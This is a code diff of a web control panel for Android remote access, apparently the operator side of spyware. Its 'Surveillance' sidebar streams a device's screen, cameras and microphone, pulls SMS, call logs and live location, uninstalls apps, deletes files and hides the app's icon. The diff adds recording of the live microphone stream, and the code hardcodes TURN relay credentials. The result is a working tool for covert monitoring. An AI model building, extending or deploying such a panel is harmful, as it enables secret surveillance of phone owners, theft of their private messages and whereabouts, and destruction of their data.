@@ -22,7 +22,6 @@
             --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
             --shadow-lg: 0 4px 20px rgba(0,0,0,0.1);
             
-            /* Button sizes - consistent across all devices */
             --btn-height: 44px;
             --btn-padding: 12px;
             --btn-icon-size: 20px;
@@ -30,7 +29,6 @@
             --font-size-small: 12px;
         }
 
-        /* ---------- Global Styles ---------- */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -47,7 +45,6 @@
             color: var(--text-primary);
         }
 
-        /* ---------- Sidebar (Desktop) ---------- */
         #sidebar {
             width: 280px;
             background: var(--bg-sidebar);
@@ -59,7 +56,6 @@
             z-index: 1000;
         }
 
-        /* Mobile Sidebar - Hidden by default, shown via menu */
         @media (max-width: 768px) {
             body {
                 flex-direction: column;
@@ -81,7 +77,6 @@
                 transform: translateX(0);
             }
             
-            /* Overlay when sidebar is open on mobile */
             .sidebar-overlay {
                 display: none;
                 position: fixed;
@@ -120,7 +115,6 @@
             }
         }
 
-        /* ---------- Header Section ---------- */
         #header {
             height: 70px;
             background: var(--bg-panel);
@@ -139,7 +133,6 @@
             gap: 20px;
         }
 
-        /* Mobile menu button */
         .menu-btn {
             display: none;
             background: transparent;
@@ -158,7 +151,6 @@
             }
         }
 
-        /* Device selector */
         .device-selector-container {
             display: flex;
             align-items: center;
@@ -186,14 +178,12 @@
             white-space: nowrap;
         }
 
-        /* Header right section */
         .header-right {
             display: flex;
             align-items: center;
             gap: 15px;
         }
 
-        /* Battery indicator */
         #batteryInfo {
             display: none;
             align-items: center;
@@ -236,7 +226,6 @@
             min-width: 45px;
         }
 
-        /* Status indicator */
         #status {
             padding: 8px 16px;
             height: var(--btn-height);
@@ -267,7 +256,6 @@
             white-space: nowrap;
         }
 
-        /* ---------- Main Content Area ---------- */
         #main {
             flex: 1;
             display: flex;
@@ -291,7 +279,6 @@
             position: relative;
         }
 
-        /* Welcome message */
         #welcomeMessage {
             text-align: center;
             padding: 40px 20px;
@@ -307,7 +294,6 @@
             margin: 10px 0;
         }
 
-        /* ---------- Sidebar Content ---------- */
         .logo {
             font-size: 20px;
             font-weight: 600;
@@ -328,7 +314,6 @@
             margin-bottom: 12px;
         }
 
-        /* Standard button styling - consistent across all devices */
         button {
             width: 100%;
             height: var(--btn-height);
@@ -360,7 +345,6 @@
             text-align: center;
         }
 
-        /* Camera panels */
         .camera-panel {
             background: #f0f2f5;
             border-radius: 8px;
@@ -410,7 +394,6 @@
             background: var(--primary-dark);
         }
 
-        /* Live controls */
         .live-controls {
             display: flex;
             gap: 8px;
@@ -439,7 +422,6 @@
             background: var(--danger-dark);
         }
 
-        /* ---------- File Manager ---------- */
         .file-manager {
             display: flex;
             flex-direction: column;
@@ -625,7 +607,6 @@
             font-weight: 500;
         }
 
-        /* ---------- Tables ---------- */
         table {
             width: 100%;
             border-collapse: collapse;
@@ -662,7 +643,6 @@
             }
         }
 
-        /* ---------- Map ---------- */
         #map {
             height: 400px;
             border-radius: 10px;
@@ -693,7 +673,6 @@
             }
         }
 
-        /* ---------- App List ---------- */
         .app-item {
             display: flex;
             align-items: center;
@@ -762,7 +741,6 @@
             border: none;
         }
 
-        /* ---------- MODAL / POPUP (Screen Share) ---------- */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -771,14 +749,13 @@
             justify-content: center;
             align-items: center;
             z-index: 10000;
-            overflow-x: auto; /* Allow horizontal scroll if screen < 360px */
+            overflow-x: auto;
         }
 
         .modal-overlay.show {
             display: flex;
         }
 
-        /* Fixed size popup: 360x640 */
         .mobile-popup {
             width: 360px;
             height: 640px;
@@ -789,7 +766,7 @@
             border: 4px solid #2e2e2e;
             box-shadow: var(--shadow-lg);
             overflow: hidden;
-            flex-shrink: 0; /* Prevent shrinking */
+            flex-shrink: 0;
         }
 
         .phone-frame {
@@ -800,16 +777,15 @@
             background: black;
             overflow: hidden;
             width: 100%;
-            height: calc(640px - 84px); /* 84px = button area height approx */
+            height: calc(640px - 84px);
         }
 
         .phone-frame video {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* Keep aspect ratio, letterbox if needed */
+            object-fit: contain;
         }
 
-        /* Control bar - FIXED BUTTON SIZES */
         .popup-controls {
             flex-shrink: 0;
             background: #111;
@@ -819,10 +795,9 @@
             justify-content: center;
             align-items: center;
             border-top: 1px solid #333;
-            height: 84px; /* Fixed height for control bar */
+            height: 84px;
         }
 
-        /* Fixed size buttons - consistent across all devices */
         .popup-controls button {
             width: 60px;
             height: 60px;
@@ -843,7 +818,6 @@
             flex: none;
         }
 
-        /* Close button slightly larger */
         .popup-controls button.close-btn {
             background: #c0392b;
             width: 70px;
@@ -863,7 +837,6 @@
             transform: scale(0.95);
         }
 
-        /* On very small screens, keep fixed size but allow scrolling */
         @media (max-width: 400px) {
             .modal-overlay {
                 justify-content: flex-start;
@@ -871,7 +844,6 @@
             }
         }
 
-        /* Blur effect when modal is open */
         body.modal-open #sidebar,
         body.modal-open #main {
             pointer-events: none;
@@ -879,7 +851,6 @@
             transition: filter 0.3s;
         }
 
-        /* Image and video display */
         img, video {
             max-width: 100%;
             max-height: 70vh;
@@ -893,7 +864,6 @@
             margin-top: 15px;
         }
 
-        /* Pagination */
         .pagination {
             margin-top: 20px;
             display: flex;
@@ -925,10 +895,8 @@
 </head>
 <body>
 
-<!-- Sidebar Overlay (for mobile) -->
 <div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
 
-<!-- MODAL OVERLAY (for screen share) -->
 <div id="screenModalOverlay" class="modal-overlay">
     <div class="mobile-popup" id="mobilePopup">
         <div class="phone-frame">
@@ -957,7 +925,6 @@
         <div class="section-title">Surveillance</div>
         <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
 
-        <!-- Click Picture panel -->
         <button onclick="toggleCameraPanel('click')"><span>📷</span> <span>Click Picture</span></button>
         <div id="clickCameraPanel" class="camera-panel">
             <div class="camera-option">
@@ -970,7 +937,6 @@
             <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
         </div>
 
-        <!-- See Live panel -->
         <button onclick="toggleCameraPanel('live')"><span>📹</span> <span>See Live</span></button>
         <div id="liveCameraPanel" class="camera-panel">
             <div class="camera-option">
@@ -983,7 +949,6 @@
             <button class="live-btn" onclick="startLiveStream()">See Live</button>
         </div>
 
-        <!-- Live Audio button -->
         <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
         <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn"><span>⏹</span> <span>Stop Live Audio</span></button>
 
@@ -1038,19 +1003,16 @@
     </div>
 </div>
 
-<!-- Leaflet -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
     // ---------- GLOBALS ----------
     const WS_URL = "wss://mirror-view.onrender.com";
     let ws = null;
 
-    // WebRTC peer connections
     let screenPC = null;
     let cameraPC = null;
     let audioPC = null;
 
-    // UI state
     let mapInstance = null;
     let currentData = [];
     let currentPage = 0;
@@ -1060,39 +1022,37 @@
     let screenActive = false;
     let iconHidden = false;
 
-    // Live camera recording state
     let mediaRecorder = null;
     let recordedChunks = [];
 
-    // Track the last command sent to interpret raw responses
     let pendingCommand = null;
 
-    // Store connected devices
     let devices = new Map();
     let currentDeviceId = null;
 
-    // Battery info
     let currentBatteryLevel = 0;
     let currentBatteryStatus = 'unknown';
+
+    // Audio recording variables
+    let audioMediaRecorder = null;
+    let audioRecordedChunks = [];
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
 
-    // Modal elements
     const modalOverlay = document.getElementById('screenModalOverlay');
     const modalVideo = document.getElementById('modalScreenVideo');
     const modalSnapBtn = document.getElementById('modalSnapBtn');
     const modalRecordBtn = document.getElementById('modalRecordBtn');
     const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
     const modalCloseBtn = document.getElementById('modalCloseBtn');
-   
+
     function getFormattedDateTime() {
         const d = new Date();
         const pad = (n) => n.toString().padStart(2, '0');
         return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
     }
 
-    // ---------- ICE SERVERS ----------
     const ICE_SERVERS = [
         { urls: "stun:stun.relay.metered.ca:80" },
         { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
@@ -1101,7 +1061,6 @@
         { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
     ];
 
-    // ---------- SIGNALING OVER WEBSOCKET ----------
     function sendSignalingMessage(msg) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
             console.error('WebSocket not open');
@@ -1115,7 +1074,6 @@
         console.log('📤 Signaling sent:', msg.type);
     }
 
-    // ---------- PEER CONNECTION CREATORS ----------
     function createPeerConnection(streamType, onTrackCallback, useMic = false) {
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
 
@@ -1147,6 +1105,9 @@
                     screenActive = false;
                     document.getElementById('screenBtn').innerText = 'Start Screen';
                     closeScreenModal();
+                } else if (streamType === 'audio') {
+                    // Auto-stop audio if disconnected
+                    stopLiveAudio();
                 }
             }
         };
@@ -1160,7 +1121,6 @@
         return null;
     }
 
-    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
     function handleSignalingMessage(msg) {
         console.log('Received signaling:', msg);
         if (msg.type === 'ANSWER') {
@@ -1177,7 +1137,6 @@
         }
     }
 
-    // ---------- MODAL CONTROL ----------
     function openScreenModal() {
         modalOverlay.classList.add('show');
         document.body.classList.add('modal-open');
@@ -1201,7 +1160,6 @@
         modalRecordBtn.innerText = '🔴';
     }
 
-    // ---------- SCREEN SHARE ----------
     async function toggleScreen() {
         if (!currentDeviceId) {
             alert('Please select a device first');
@@ -1236,6 +1194,7 @@
                 });
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 screenActive = true;
+                showNotification("Screen sharing started. A system notification will appear – this is normal.");
             } catch (e) {
                 console.error('Screen share failed:', e);
                 showNotification('Failed: ' + e.message);
@@ -1245,7 +1204,6 @@
         }
     }
 
-    // ---------- SNAP SCREEN ----------
     function snapScreenFromModal() {
         if (!modalVideo || !modalVideo.videoWidth) {
             alert('No active screen share or video not ready');
@@ -1265,7 +1223,6 @@
         }, 'image/png');
     }
 
-    // ---------- RECORD SCREEN ----------
     let screenMediaRecorder = null;
     let screenRecordedChunks = [];
 
@@ -1328,7 +1285,6 @@
         }
     }
 
-    // ---------- LIVE CAMERA ----------
     async function startLiveStream() {
         if (!currentDeviceId) {
             alert('Please select a device first');
@@ -1379,7 +1335,7 @@
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- LIVE AUDIO ----------
+    // Updated Live Audio with recording
     async function toggleLiveAudio() {
         if (!currentDeviceId) {
             alert('Please select a device first');
@@ -1394,7 +1350,17 @@
     }
 
     async function startLiveAudio() {
-        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
+        panel.innerHTML = `
+            <div style="text-align:center;">
+                <p>Live audio streaming...</p>
+                <audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio>
+                <div class="live-controls" style="margin-top:15px;">
+                    <button onclick="toggleAudioRecording()" id="audioRecordBtn">🔴 Record</button>
+                    <button class="stop" onclick="stopLiveAudio()">Stop</button>
+                </div>
+            </div>
+        `;
+
         audioPC = createPeerConnection('audio', (e) => {
             const audioEl = document.getElementById('liveAudio');
             if (audioEl) {
@@ -1423,6 +1389,11 @@
     }
 
     function stopLiveAudio() {
+        // Stop any ongoing audio recording
+        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
+            stopAudioRecording();
+        }
+
         if (audioPC) {
             audioPC.close();
             audioPC = null;
@@ -1433,7 +1404,50 @@
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- COMMAND SENDING (JSON) ----------
+    // Audio recording functions
+    function toggleAudioRecording() {
+        const audioEl = document.getElementById('liveAudio');
+        if (!audioEl || !audioEl.srcObject) {
+            alert('No active audio stream');
+            return;
+        }
+
+        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
+            stopAudioRecording();
+            document.getElementById('audioRecordBtn').innerText = '🔴 Record';
+        } else {
+            startAudioRecording(audioEl.srcObject);
+            document.getElementById('audioRecordBtn').innerText = '⏹ Stop Recording';
+        }
+    }
+
+    function startAudioRecording(stream) {
+        audioRecordedChunks = [];
+        audioMediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+        audioMediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) audioRecordedChunks.push(e.data);
+        };
+        audioMediaRecorder.onstop = () => {
+            const blob = new Blob(audioRecordedChunks, { type: 'audio/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `audio-recording-${getFormattedDateTime()}.webm`;
+            a.click();
+            URL.revokeObjectURL(url);
+            audioRecordedChunks = [];
+        };
+        audioMediaRecorder.start();
+        showNotification('Recording started');
+    }
+
+    function stopAudioRecording() {
+        if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
+            audioMediaRecorder.stop();
+            audioMediaRecorder = null;
+        }
+    }
+
     function sendCommand(command, params = {}) {
         if (!currentDeviceId) {
             panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
@@ -1460,7 +1474,6 @@
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
-    // ---------- PLAIN TEXT SENDING ----------
     function sendPlainText(msg) {
         if (!currentDeviceId) {
             panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
@@ -1476,11 +1489,10 @@
         panel.innerHTML = `📤 Plain text sent: ${msg}`;
     }
 
-    // Handle device registration
     function handleDeviceRegistration(data) {
         const deviceId = data.deviceId;
         const deviceName = data.name || data.manufacturer + ' ' + data.model;
-        
+
         devices.set(deviceId, {
             id: deviceId,
             name: deviceName,
@@ -1489,10 +1501,10 @@
             androidVersion: data.androidVersion,
             lastSeen: Date.now()
         });
-        
+
         updateDeviceSelector();
         showNotification(`New device connected: ${deviceName}`);
-        
+
         if (devices.size === 1) {
             currentDeviceId = deviceId;
             document.getElementById('deviceSelector').value = deviceId;
@@ -1500,15 +1512,14 @@
         }
     }
 
-    // Update device selector dropdown
     function updateDeviceSelector() {
         const selector = document.getElementById('deviceSelector');
         const countSpan = document.getElementById('deviceCount');
-        
+
         const currentValue = selector.value;
-        
+
         selector.innerHTML = '<option value="">Select Device</option>';
-        
+
         devices.forEach((device, id) => {
             const option = document.createElement('option');
             option.value = id;
@@ -1518,36 +1529,34 @@
             }
             selector.appendChild(option);
         });
-        
+
         countSpan.textContent = devices.size;
-        
+
         if (currentValue && devices.has(currentValue)) {
             selector.value = currentValue;
         }
     }
 
-    // Switch to different device
     function switchDevice(deviceId) {
         if (!deviceId) {
             currentDeviceId = null;
             showWelcomeMessage(true);
             return;
         }
-        
+
         currentDeviceId = deviceId;
         showWelcomeMessage(false);
-        
+
         if (ws && ws.readyState === WebSocket.OPEN) {
             ws.send(JSON.stringify({
                 type: 'SWITCH_DEVICE',
                 deviceId: deviceId
             }));
         }
-        
+
         showNotification(`Switched to ${devices.get(deviceId)?.name}`);
     }
 
-    // Show/hide welcome message
     function showWelcomeMessage(show) {
         const welcomeMsg = document.getElementById('welcomeMessage');
         if (welcomeMsg) {
@@ -1559,44 +1568,41 @@
         }
     }
 
-    // Handle battery updates
     function updateBatteryInfo(level, charging) {
         currentBatteryLevel = level;
         currentBatteryStatus = charging ? 'charging' : 'discharging';
-        
+
         const batteryDiv = document.getElementById('batteryInfo');
         const levelDiv = document.querySelector('.battery-level');
         const percentSpan = document.querySelector('.battery-percent');
         const iconDiv = document.querySelector('.battery-icon');
-        
+
         if (level >= 0) {
             batteryDiv.style.display = 'flex';
             levelDiv.style.width = level + '%';
-            
+
             if (level <= 15) levelDiv.style.background = '#f44336';
             else if (level <= 30) levelDiv.style.background = '#ff9800';
             else levelDiv.style.background = '#4caf50';
-            
+
             if (charging) {
                 iconDiv.classList.add('charging');
             } else {
                 iconDiv.classList.remove('charging');
             }
-            
+
             percentSpan.textContent = level + '%';
         }
     }
 
-    // Get installed apps
     function getInstalledApps() {
         sendCommand('GET_INSTALLED_APPS');
     }
 
-    // Display installed apps
     function displayInstalledApps(apps) {
         let html = '<h3>📱 Installed Apps</h3>';
         html += '<div style="max-height: 500px; overflow-y: auto;">';
-        
+
         apps.forEach(app => {
             html += `
                 <div class="app-item">
@@ -1612,34 +1618,43 @@
                 </div>
             `;
         });
-        
+
         html += '</div>';
         panel.innerHTML = html;
     }
 
-    // Uninstall app
     function uninstallApp(packageName) {
         if (confirm(`Uninstall ${packageName}?`)) {
             sendCommand('UNINSTALL_APP', { package: packageName });
         }
     }
 
-    // Open app
     function openApp(packageName) {
         sendCommand('OPEN_APP', { package: packageName });
     }
 
-    // Delete file
     function deleteFile(path) {
         if (confirm(`Delete ${path}?`)) {
             sendCommand('DELETE_FILE', { path: path });
         }
     }
 
-    // ---------- PLAIN TEXT / JSON HANDLERS ----------
+    // Helper to parse data if it's a string
+    function parseDataField(data) {
+        if (typeof data === 'string') {
+            try {
+                return JSON.parse(data);
+            } catch (e) {
+                console.error('Failed to parse data string', e);
+                return null;
+            }
+        }
+        return data;
+    }
+
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
-        
+
         if (json.deviceId && json.deviceId !== currentDeviceId) {
             console.log('Message from non-selected device:', json.deviceId);
             if (!devices.has(json.deviceId)) {
@@ -1657,7 +1672,6 @@
                 break;
 
             case 'DEVICE_LIST':
-                // Replace entire device list
                 devices.clear();
                 if (Array.isArray(json.devices)) {
                     json.devices.forEach(device => {
@@ -1666,7 +1680,6 @@
                 }
                 updateDeviceSelector();
                 if (devices.size > 0 && !currentDeviceId) {
-                    // Optionally select first device
                     const firstId = devices.keys().next().value;
                     switchDevice(firstId);
                 }
@@ -1693,24 +1706,24 @@
 
             case 'SMS_DATA':
                 dataType = 'sms';
-                currentData = json.data;
+                currentData = parseDataField(json.data);
                 renderTable();
                 break;
 
             case 'CALL_LOGS':
                 dataType = 'call';
-                currentData = json.data;
+                currentData = parseDataField(json.data);
                 renderTable();
                 break;
 
             case 'FILE_LIST':
                 dataType = 'file';
-                currentData = json.data;
+                currentData = parseDataField(json.data);
                 renderFiles();
                 break;
 
             case 'LOCATION_UPDATE':
-                renderMap(json.data);
+                renderMap(parseDataField(json.data));
                 break;
 
             case 'CAMERA_IMAGE':
@@ -1769,7 +1782,7 @@
                 }
                 break;
         }
-        
+
         pendingCommand = null;
     }
 
@@ -1853,7 +1866,6 @@
         }
     }
 
-    // ---------- CAMERA UI ----------
     function toggleCameraPanel(panelId) {
         const clickPanel = document.getElementById('clickCameraPanel');
         const livePanel = document.getElementById('liveCameraPanel');
@@ -1881,7 +1893,6 @@
         `;
     }
 
-    // ---------- LIVE STREAM ACTIONS ----------
     function takeSnapshot() {
         const video = document.getElementById('liveCamVideo');
         if (!video || !video.videoWidth) {
@@ -1954,13 +1965,11 @@
         document.getElementById('recordBtn').innerText = 'Stop Recording';
     }
 
-    // ---------- APP ICON TOGGLE ----------
     function toggleAppIcon() {
         if (iconHidden) sendPlainText('showApp');
         else sendPlainText('hideApp');
     }
 
-    // ---------- RENDERERS ----------
     function showAudio(base64) {
         panel.innerHTML = `
             <audio controls src="data:audio/3gp;base64,${base64}"></audio>
@@ -1976,23 +1985,28 @@
     }
 
     function renderMap(loc) {
+        if (!loc || typeof loc.lat !== 'number' || typeof loc.lon !== 'number') {
+            panel.innerHTML = '<p>Invalid location data</p>';
+            return;
+        }
+
         panel.innerHTML = '<div id="map" style="position:relative;"></div>';
         const mapDiv = document.getElementById('map');
 
         const infoDiv = document.createElement('div');
         infoDiv.className = 'map-info';
         infoDiv.innerHTML = `
-            <div class="coord">📍 ${typeof loc.lat === 'string' ? parseFloat(loc.lat).toFixed(6) : loc.lat.toFixed(6)}, ${typeof loc.lon === 'string' ? parseFloat(loc.lon).toFixed(6) : loc.lon.toFixed(6)}</div>
-            <div>🎯 Accuracy: ${loc.accuracy ? (typeof loc.accuracy === 'string' ? parseFloat(loc.accuracy).toFixed(1) : loc.accuracy.toFixed(1)) : '?'} m</div>
+            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
+            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
             <div>📡 Provider: ${loc.provider || 'unknown'}</div>
             <div class="addr">🌍 Loading address...</div>
         `;
         mapDiv.appendChild(infoDiv);
 
         if (mapInstance) mapInstance.remove();
-        mapInstance = L.map(mapDiv).setView([parseFloat(loc.lat), parseFloat(loc.lon)], 18);
+        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([parseFloat(loc.lat), parseFloat(loc.lon)], { radius: loc.accuracy ? parseFloat(loc.accuracy) : 10, color: '#1976ff' }).addTo(mapInstance);
+        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
 
         fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
             headers: { 'User-Agent': 'SystemSync-Console/1.0' }
@@ -2188,7 +2202,6 @@
         setTimeout(() => { statusEl.innerText = orig; }, 2000);
     }
 
-    // ---------- WEBSOCKET MESSAGE HANDLER ----------
     function handleIncomingMessage(msg) {
         try {
             const json = JSON.parse(msg);
@@ -2202,7 +2215,6 @@
         }
     }
 
-    // ---------- WEBSOCKET CONNECTION ----------
     function connectWebSocket() {
         if (ws) {
             ws.close();
@@ -2213,7 +2225,7 @@
             console.log('WebSocket connected');
             ws.send('I_AM_WEB');
             setStatus('ONLINE');
-            
+
             const welcomeMsg = document.getElementById('welcomeMessage');
             if (welcomeMsg) {
                 welcomeMsg.innerHTML = `
@@ -2223,13 +2235,9 @@
                 `;
                 welcomeMsg.style.display = 'block';
             }
-            
-            // Request device list
-            ws.send(JSON.stringify({
-                type: 'GET_DEVICES'
-            }));
 
-            // Set up periodic device list refresh
+            ws.send(JSON.stringify({ type: 'GET_DEVICES' }));
+
             if (window.deviceListInterval) clearInterval(window.deviceListInterval);
             window.deviceListInterval = setInterval(() => {
                 if (ws && ws.readyState === WebSocket.OPEN) {
@@ -2256,7 +2264,6 @@
         };
     }
 
-    // Hide flash option for front camera
     document.querySelectorAll('input[name="clickCameraSelect"]').forEach(radio => {
         radio.addEventListener('change', function() {
             const flashCheckbox = document.getElementById('clickFlashCheckbox');
@@ -2277,27 +2284,20 @@
         }
     });
 
-    // Modal button listeners
     modalSnapBtn.addEventListener('click', snapScreenFromModal);
     modalRecordBtn.addEventListener('click', toggleScreenRecording);
     modalFullscreenBtn.addEventListener('click', toggleFullscreen);
     modalCloseBtn.addEventListener('click', closeScreenModal);
 
-    // Update modal aspect ratio based on video dimensions
-    modalVideo.addEventListener("loadedmetadata", () => {
-        // No need to adjust popup size - it's fixed 360x640
-        // Just ensure video fits
-    });
+    modalVideo.addEventListener("loadedmetadata", () => {});
 
-    // Mobile sidebar toggle
     function toggleSidebar() {
         const sidebar = document.getElementById('sidebar');
         const overlay = document.getElementById('sidebarOverlay');
         sidebar.classList.toggle('show');
         overlay.classList.toggle('show');
     }
-    
-    // Close sidebar when window is resized to desktop size
+
     window.addEventListener('resize', function() {
         if (window.innerWidth > 768) {
             document.getElementById('sidebar').classList.remove('show');
@@ -2305,7 +2305,6 @@
         }
     });
 
-    // ---------- ATTACH FUNCTIONS TO WINDOW ----------
     window.toggleScreen = toggleScreen;
     window.toggleCameraPanel = toggleCameraPanel;
     window.capturePicture = capturePicture;
@@ -2332,10 +2331,10 @@
     window.deleteFile = deleteFile;
     window.switchDevice = switchDevice;
     window.toggleSidebar = toggleSidebar;
+    window.toggleAudioRecording = toggleAudioRecording;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
-    // ---------- START ----------
     connectWebSocket();
 </script>
 </body>
